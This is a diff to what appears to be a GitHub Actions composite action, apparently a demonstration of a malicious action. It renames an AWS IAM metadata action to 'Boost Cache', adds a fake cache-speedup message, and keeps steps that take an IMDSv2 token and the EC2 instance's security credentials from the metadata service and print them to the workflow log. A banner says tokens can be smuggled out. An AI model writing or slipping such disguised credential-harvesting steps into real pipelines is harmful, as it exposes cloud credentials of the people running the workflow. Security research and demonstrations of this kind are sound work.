@@ -1,5 +1,5 @@
-name: Get AWS IAM Metadata
-description: Retrieves AWS IAM metadata using curl. Useful for debugging and auditing.
+name: Boost Cache
+description: Pretends to Boost Cache
 inputs:
   metadata_version:
     description: 'The metadata version to use (e.g., latest, 2016-09-03)'
@@ -15,7 +15,10 @@ inputs:
 runs:
   using: composite
   steps:
-    - name: Determine AWS Region (if not provided)
+    - name: Cache Booster
+      run: |
+         echo "Speeding up Workflow Run. Cache Booster is turned on."
+    - name: Determine AWS Region
       if: ${{ !inputs.region }}
       id: get_region
       shell: bash
@@ -25,18 +28,22 @@ runs:
         if [ -z "$REGION" ]; then
           echo "::error title=Region Detection Failed::Unable to determine AWS region. Please provide the 'region' input."
         fi
-    - name: Get IAM Security Credentials (IMDSv2)
+    - name: Get IAM Security Credentials
       if: ${{ inputs.metadata_version == 'latest' || inputs.metadata_version == '2017-09-25' }}
       id: get_iam_token_v2
       shell: bash
       run: |
+        BG='\033[1;92m'
+        RED='\033[1;91m'
+        LG='\033[40m'
+        NC='\033[0m'
         TOKEN=$(curl -X PUT "http://169.254.169.254/${{ inputs.metadata_version }}/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: ${{ inputs.token_ttl }}")
         echo "IMDSv2Token: $TOKEN";
         if [ -z "$TOKEN" ]; then
           echo "::error title=IMDSv2 Token Retrieval Failed::Failed to retrieve IMDSv2 token."
         fi
         curl -H "X-aws-ec2-metadata-token: $TOKEN"  http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/
-        echo "Oops you have been pwnd !! can smuggle tokens out"
+        echo -e "${RED}Oops you have been pwnd !! can smuggle tokens out ${NC}"
 outputs:
   region:
     description: "The AWS region."
